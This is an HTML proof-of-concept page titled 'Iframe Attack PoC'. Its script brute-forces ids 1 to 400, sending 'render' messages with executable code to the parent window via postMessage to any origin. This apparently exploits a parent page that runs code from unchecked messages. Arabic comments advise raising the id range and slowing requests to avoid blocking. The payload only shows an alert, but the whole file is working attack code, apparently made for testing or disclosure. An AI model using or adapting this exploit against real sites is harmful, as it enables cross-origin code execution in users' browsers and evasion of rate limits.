<!DOCTYPE html>
<html>
<head>
  <title>Iframe Attack PoC</title>
</head>
<body>
  <h3>📤 Sending payload to parent window...</h3>
  <script>
    const payloadTemplate = (id) => ({
      type: "render",
      id: id,
      code: "alert(`🔥 Code Executed! ID = ${id}`)"
    });

    let id = 1;
    const MAX_ID = 400; // جرّب أكثر إذا لزم

    const send = () => {
      if (id > MAX_ID) return;
      const payload = payloadTemplate(id);
      console.log("Trying ID: ", id);
      parent.postMessage(payload, "*");
      id++;
      setTimeout(send, 100); // خفف السرعة لتجنب الحظر
    };

    send();
  </script>
</body>
</html>
